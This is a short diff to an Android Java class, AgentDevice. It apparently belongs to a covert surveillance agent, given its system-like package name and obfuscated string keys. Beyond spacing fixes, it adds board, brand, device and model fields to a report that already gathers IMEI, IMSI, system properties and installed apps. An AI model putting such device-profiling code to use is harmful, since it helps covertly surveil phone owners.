@@ -21,6 +21,7 @@ import java.util.Properties;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.graphics.drawable.Drawable;
+import android.os.Build;
 
 import com.android.service.Device;
 import com.android.service.LogR;
@@ -61,7 +62,7 @@ public class AgentDevice extends AgentBase {
 	 */
 	public AgentDevice() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " DeviceAgent constructor") ;//$NON-NLS-1$
+			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
 		}
 	}
 
@@ -98,7 +99,7 @@ public class AgentDevice extends AgentBase {
 
 		// OS Version etc...
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Android") ;//$NON-NLS-1$
+			Check.log(TAG + " Android");//$NON-NLS-1$
 		}
 
 		final Runtime runtime = Runtime.getRuntime();
@@ -113,11 +114,19 @@ public class AgentDevice extends AgentBase {
 				sb.append(timestamp + "\n"); //$NON-NLS-1$
 			}
 		}
-		sb.append(Messages.getString("9.3")+"\n"); //$NON-NLS-1$
+		
+		// SYSTEM
+		sb.append(Messages.getString("9.3") + "\n"); //$NON-NLS-1$
+		sb.append(Messages.getString("9.22") + Build.BOARD + "\n");
+		sb.append(Messages.getString("9.23") + Build.BRAND + "\n");
+		sb.append(Messages.getString("9.24") + Build.DEVICE + "\n");
+		sb.append(Messages.getString("9.25") + Build.MODEL + "\n");
+		sb.append(Messages.getString("9.26") + Build.DISPLAY + "\n");
+
 		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append(Messages.getString("9.6")+"\n"); //$NON-NLS-1$
+			sb.append(Messages.getString("9.6") + "\n"); //$NON-NLS-1$
 		} else {
 			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -132,7 +141,7 @@ public class AgentDevice extends AgentBase {
 			sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
 		}
 
-		sb.append(Messages.getString("9.17")+"\n"); //$NON-NLS-1$
+		sb.append(Messages.getString("9.17") + "\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
@@ -179,7 +188,8 @@ public class AgentDevice extends AgentBase {
 	 */
 	private void readCpuUsage() {
 		try {
-			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(Messages.getString("9.21"))), //$NON-NLS-1$
+			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
+					Messages.getString("9.21"))), //$NON-NLS-1$
 					1000);
 			final String load = reader.readLine();
 			reader.close();
@@ -194,7 +204,7 @@ public class AgentDevice extends AgentBase {
 			this.cpuIdle = currIdle;
 		} catch (final IOException ex) {
 			if (Cfg.DEBUG) {
-				Check.log(ex) ;//$NON-NLS-1$
+				Check.log(ex);//$NON-NLS-1$
 			}
 		}
 	}
@@ -255,7 +265,7 @@ public class AgentDevice extends AgentBase {
 		final int max = apps.size();
 		for (int i = 0; i < max; i++) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + apps.get(i).toString()) ;//$NON-NLS-1$
+				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
 			}
 		}
 		return apps;
